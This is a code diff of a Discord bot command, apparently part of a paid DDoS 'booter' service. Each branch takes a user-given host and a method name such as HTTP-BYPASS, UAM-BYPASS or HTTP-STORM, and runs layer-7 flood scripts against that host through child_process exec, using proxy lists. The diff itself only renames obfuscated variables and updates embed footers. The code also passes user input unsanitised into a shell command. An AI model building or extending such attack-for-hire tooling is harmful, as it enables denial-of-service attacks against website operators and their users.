@@ -1,6 +1,4 @@
-const {
-    MessageEmbed
-} = require('discord.js');
+const { MessageEmbed } = require('discord.js');
 const ayarlar = require('../../ayarlar.json');
 var version = ayarlar['versionbot'];
 var roleID6 = ayarlar['roleID6'];
@@ -70,11 +68,11 @@ module['exports'] = {
             })
         };
         const _0xf396x9 = _0xf396x8['options']['getString']('methods');
-        const _0xf396xa = _0xf396x8['options']['getString']('host');
+        const _website = _0xf396x8['options']['getString']('host');
             if (_0xf396x9 === 'BASIC-KID') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -82,7 +80,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -100,8 +98,11 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -113,9 +114,9 @@ module['exports'] = {
             })
         }
         if (_0xf396x9 === 'HTTP-LOAD') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -123,7 +124,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -141,8 +142,11 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -153,9 +157,9 @@ module['exports'] = {
                 }, 3000)
             })
         }if (_0xf396x9 === 'raw') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -163,7 +167,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -181,8 +185,11 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -194,9 +201,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'HTTP-MAX') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 5 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 5 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -204,7 +211,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -222,8 +229,11 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -235,9 +245,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'HTTP-BYPASS') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -245,7 +255,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -263,8 +273,11 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -276,9 +289,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'UAM-BYPASS') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 120 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 120 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -286,7 +299,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -304,8 +317,11 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -317,9 +333,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'HTTP-STORM') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -327,7 +343,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -345,8 +361,9 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+              ['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: overkill#4176', iconURL: img })['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -358,9 +375,9 @@ module['exports'] = {
             })
         }
             if (_0xf396x9 === 'HTTP-OFF') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 off 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/'}${_method}${'.js '}${_website}${' 60 off 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -368,7 +385,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -386,8 +403,11 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -399,9 +419,9 @@ module['exports'] = {
             })
         }
         if (_0xf396x9 === 'http2') {
-            var _0xf396xb = _0xf396x9;
-            var _0xf396xc = require('child_process')['exec'];
-            _0xf396xc(`${'node methods-basic/L7/http2'}${_0xf396xb}${'.js '}${_0xf396xa}${' 10 60 proxynofilter.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            var _method = _0xf396x9;
+            const { exec } = require('child_process');
+            exec(`${'node basic/L7/http2'}${_method}${'.js '}${_website}${' 10 60 proxynofilter.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -409,7 +429,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_0xf396xa}${' ] '}`,
+                value: `${' [ '}${_website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Method:`**',
@@ -427,8 +447,11 @@ module['exports'] = {
                 name: '**`💸 Plan:`**',
                 value: `${' [ BASIC ] '}`,
                 inline: true
-            })['setImage'](randomgif)['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: OverKill', img)['setTimestamp']();
+            })['setImage'](randomgif)
+['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
+['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
